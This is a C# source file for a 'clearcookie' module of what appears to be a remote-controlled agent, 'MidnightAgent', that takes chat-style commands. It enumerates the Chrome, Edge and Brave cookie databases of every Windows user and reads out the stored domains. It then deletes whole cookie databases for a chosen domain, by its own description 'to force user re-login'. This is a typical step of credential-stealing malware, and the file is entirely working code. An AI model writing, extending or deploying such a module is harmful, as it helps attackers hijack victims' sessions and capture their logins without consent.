using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MidnightAgent.Utils;

namespace MidnightAgent.Features
{
    public class CookieFeature : IFeature
    {
        public string Command => "clearcookie";
        public string Description => "List/Delete cookies (to force user re-login)";
        public string Usage => "/clearcookie [domain]";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                var cookieFiles = FindAllCookieFiles();
                if (cookieFiles.Count == 0)
                {
                    return Task.FromResult(FeatureResult.Fail("❌ No browser cookie files found."));
                }

                if (args.Length == 0)
                {
                    // List mode
                    var sb = new StringBuilder();
                    sb.AppendLine("🍪 <b>Found Cookie Databases:</b>");
                    foreach(var f in cookieFiles)
                    {
                        sb.AppendLine($"- {f}");
                    }
                    sb.AppendLine("\n🔍 <b>Top Domains (Sample):</b>");
                    
                    var domains = GetTopDomains(cookieFiles);
                    foreach(var d in domains)
                    {
                        sb.AppendLine($"- {d}");
                    }
                    
                    sb.AppendLine("\n⚠️ Use <code>/clearcookie &lt;domain&gt;</code> to delete cookies and force re-login.");
                    return Task.FromResult(FeatureResult.Ok(sb.ToString()));
                }
                else
                {
                    // Delete mode - Since we don't have a full SQLite engine to execute DELETE WHERE,
                    // We have to delete the whole file to be sure. This is "Nuclear Option".
                    // Or if we want to be smarter, we could try to find sqlite3.dll but it's risky.
                    // For now, let's just wipe the file if the user confirms or forced.
                    
                    string targetDomain = args[0].ToLower();
                    int totalDeleted = 0;
                    var sb = new StringBuilder();
                    
                    // Check if browsers are running
                    var riskProcesses = new[] { "chrome", "msedge", "brave" };
                    bool isRunning = Process.GetProcesses().Any(p => riskProcesses.Contains(p.ProcessName.ToLower()));
                    
                    if (isRunning)
                    {
                         sb.AppendLine("⚠️ <b>Warning:</b> Browsers are running. Please close them first.");
                         return Task.FromResult(FeatureResult.Fail(sb.ToString()));
                    }

                    foreach (var dbPath in cookieFiles)
                    {
                        try
                        {
                            // Check if this DB contains the target domain
                            bool containsDomain = false;
                            string tempCheck = Path.GetTempFileName();
                            try 
                            { 
                                File.Copy(dbPath, tempCheck, true);
                                var handler = new SqliteHandler(tempCheck);
                                if (handler.ReadTable("cookies"))
                                {
                                    // Iterate to find domain (checking first 5 columns usually covers host_key)
                                    // SqliteHandler logic: content is string array.
                                    // We'll just check if ANY field contains the domain string
                                    for(int i=0; i<handler.GetRowCount(); i++)
                                    {
                                        var fields = handler.GetValues(i, 0);
                                        if (fields != null && fields.Any(f => f != null && f.Contains(targetDomain)))
                                        {
                                            containsDomain = true;
                                            break;
                                        }
                                    }
                                }
                            }
                            catch {}
                            finally { try { File.Delete(tempCheck); } catch { } }

                            if (containsDomain)
                            {
                                // Delete the file
                                File.Delete(dbPath);
                                // Delete Journal/WAL if exists
                                if (File.Exists(dbPath + "-journal")) File.Delete(dbPath + "-journal");
                                if (File.Exists(dbPath + "-wal")) File.Delete(dbPath + "-wal");
                                
                                sb.AppendLine($"✅ Wiped cookies in {Path.GetFileName(Path.GetDirectoryName(Path.GetDirectoryName(dbPath)))}/{Path.GetFileName(Path.GetDirectoryName(dbPath))} (Found '{targetDomain}')");
                                totalDeleted++;
                            }
                        }
                        catch (Exception ex)
                        {
                            sb.AppendLine($"❌ Failed {dbPath}: {ex.Message}");
                        }
                    }
                    
                    if (totalDeleted > 0)
                    {
                        sb.AppendLine($"\n🎉 <b>Total Wiped: {totalDeleted} Database Files containing '{targetDomain}'</b>");
                        sb.AppendLine("(Note: This clears ALL cookies in those profiles to ensure re-login)");
                    }
                    else
                    {
                        sb.AppendLine($"\n⚠️ No cookie databases found containing '{targetDomain}'");
                    }
                    
                    return Task.FromResult(FeatureResult.Ok(sb.ToString()));
                }
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Error: {ex.Message}"));
            }
        }

        private List<string> FindAllCookieFiles()
        {
            var results = new List<string>();
            var usersDir = @"C:\Users";
            
            if (!Directory.Exists(usersDir)) return results;

            foreach (var userDir in Directory.GetDirectories(usersDir))
            {
                // Chrome
                AddCookiesFromPath(results, Path.Combine(userDir, @"AppData\Local\Google\Chrome\User Data"));
                // Edge
                AddCookiesFromPath(results, Path.Combine(userDir, @"AppData\Local\Microsoft\Edge\User Data"));
                // Brave
                AddCookiesFromPath(results, Path.Combine(userDir, @"AppData\Local\BraveSoftware\Brave-Browser\User Data"));
            }
            
            return results;
        }

        private void AddCookiesFromPath(List<string> results, string userDataDir)
        {
            if (!Directory.Exists(userDataDir)) return;

            // Default profile
            CheckProfile(results, Path.Combine(userDataDir, "Default"));

            // Other profiles (Profile 1, Profile 2, etc.)
            foreach (var dir in Directory.GetDirectories(userDataDir, "Profile *"))
            {
                CheckProfile(results, dir);
            }
        }

        private void CheckProfile(List<string> results, string profileDir)
        {
            // Modern path: Network/Cookies
            string p1 = Path.Combine(profileDir, "Network", "Cookies");
            if (File.Exists(p1)) results.Add(p1);
            
            // Old path: Cookies
            string p2 = Path.Combine(profileDir, "Cookies");
            if (File.Exists(p2)) results.Add(p2);
        }

        private List<string> GetTopDomains(List<string> dbPaths)
        {
            var domains = new HashSet<string>();
            int limit = 20;

            foreach (var dbPath in dbPaths)
            {
                // Copy to temp to read without lock issues
                string tempCopy = Path.GetTempFileName();
                try
                {
                    File.Copy(dbPath, tempCopy, true);
                    var handler = new SqliteHandler(tempCopy);
                    if (handler.ReadTable("cookies")) // Returns bool
                    {
                        int rowCount = handler.GetRowCount();
                        for (int i = 0; i < rowCount; i++)
                        {
                            // Try common index for host_key (usually 1 or 4)
                            // We check fields that look like domains
                            var val = handler.GetValue(i, 1); // Index 1 is often host_key
                            if (string.IsNullOrEmpty(val)) val = handler.GetValue(i, 4);

                            if (!string.IsNullOrEmpty(val) && val.Contains("."))
                            {
                                domains.Add(val);
                                if (domains.Count >= limit) break;
                            }
                        }
                    }
                }
                catch { }
                finally
                {
                    try { File.Delete(tempCopy); } catch { }
                }
                if (domains.Count >= limit) break;
            }
            return domains.ToList();
        }
    }
}
